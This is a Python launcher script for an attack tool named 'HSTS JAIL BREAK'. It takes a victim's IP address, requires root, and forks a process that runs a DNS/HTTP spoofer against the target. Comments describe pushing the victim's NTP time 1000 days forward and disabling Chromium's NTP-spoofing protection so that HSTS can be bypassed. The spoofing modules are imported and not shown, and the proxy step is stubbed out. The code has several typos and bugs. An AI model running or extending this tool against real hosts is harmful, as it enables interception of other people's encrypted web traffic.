import sys
#sys.stderr = None
import platform
import subprocess
import getopt
import utils.banner as banner
import spoofing.spoofer as spoofer
import os 
import re 
from  utils.printing import Printing
from scapy.all import conf
ALLOWED_PLATFORMS = ["Darwin","Linux"]
VALID_PATTERN = r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"



def main():
    '''     
	usage: python3 hstsjailbreak.py <target> [-h,--help] [-s,--silent] [-i=,--iface=] 
                    ⛓️  🦊 HSTS JAIL BREAK 🦊 ⛓️
        mandatory arguments: 
            🧔🏽‍♂️ target - the victim's ip address
	optional arguments:      
	    💁 -h,--help show this help message and exit 
                default value : False 
	    🤫 -s,--silent silent or loud mode 
                default value : Flase 
	    📬 -i,--iface IFACE Interface you wish to use   
                default value : system default iface 
            🚽 -c ,--finishchronium ⚰️⚰️⚰️ kill the chronium code that protects againts ntp spoofing ⚰️⚰️⚰️  	
                default value : True 	
	'''
    def show_help():
         print(main.__doc__)
         sys.exit(0)
    
    platformOS = platform.system() 
    
    if platformOS  not in ALLOWED_PLATFORMS : 
        Printing.printError("You are using un-supported platform ! ")
        show_help()
        
    if os.getuid() != 0 : #check for root premissions
        Printing.printError(""" you are not privileged enough - try using 'sudo python3 ...' or 'su root' """)
        show_help()
        
    if platformOS == ALLOWED_PLATFORMS[0]:  # if we on MacOs Machine - ip fowarding 
         if "0" not in subprocess.check_output("sudo sysctl -w net.inet.ip.forwarding", shell=True).decode(encoding='ascii'): 
            Printing.printError("disable ip forwarding")
            show_help()
            
    if platformOS == ALLOWED_PLATFORMS[1]:  # if we on Linux Machine - ip forwarding 
        with open("/proc/sys/net/ipv4/ip_forward",'r') as file : 
            if file.read() != "0": 
                Printing.printError("disable ip forwarding with sysctl -w net.ipv4.ip_forward=0 ")
                show_help()
            
    if len(sys.argv) < 2  or   "-h" in sys.argv[1:] or "--help" in sys.argv[1:] : 
       show_help()
        
        
    opts, args = getopt.getopt(sys.argv[2:], "sich:", [
                                  "iface=","silent","finishchronium","help"])
    
    arguments = {
        "tatget" : sys.argv[1] , 
        "silent": False , 
        "finishchronium" :True  , 
        "interface" : conf.iface 
    } 
    
    for name , value in opts : 
        if name in ("-i " ,"--interface") :
            arguments["interface"] = value  
        if name in ("-s","--silent" ):
            arguments["silent"] = True 
        if name in ("-c","--finishchronium"):
            arguments["finishchronium"] = False 
        if name in ("-h","--help"): 
           show_help
    if not re.match(VALID_PATTERN ,arguments["tatget"]) : 
         Printing.printError("please enter valid ip to target of 4 numbers between 0 to 255 separted by . ")
         show_help()
        
        
    try : 
        if not arguments["silent"]: 
            banner.banner() 
        #ntp postion right here to 1000 days to the future 
        if os.fork() : 
            # dad process - runing the spoofer 
            spoofer.HttpDnsSpoofer(arguments["tatget"],arguments["interface"],arguments["finishchronium"])
            Printing.printLog(" <|> ".join(map(str,os.wait())))  
        else : 
            # son process - runing the proxy 
            ...
            #proxy.StartProxy()
    except Exception as e : 
        Printing.printError(e)


if __name__ == "__main__": 
   main()
    
   